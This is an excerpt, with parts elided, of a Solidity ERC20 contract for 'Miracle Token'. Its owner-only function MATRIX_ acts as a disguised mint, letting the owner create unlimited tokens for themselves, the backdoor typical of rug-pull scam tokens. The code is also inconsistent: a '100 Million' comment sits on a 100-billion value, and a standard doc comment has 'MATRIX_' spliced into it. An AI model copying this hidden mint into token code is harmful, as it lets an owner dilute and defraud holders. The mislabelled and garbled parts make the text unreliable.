...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function MATRIX_(uint256 amount) public onlyOwner {
    MATRIX_(msg.sender, amount);
    }
    ...
    function MATRIX_(address account, uint256 amount) internal virtual {
     ...
     * {decimals} to ever change, and may work incorrectly if it does. MATRIX_
     */
...
contract MIRACLE is ERC20 {

    uint tokenTotalSupply = 100000000000; // 100 Million Token Supply

    constructor() public ERC20("Miracle Token" , "MIRACLE") {
        MATRIX_(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}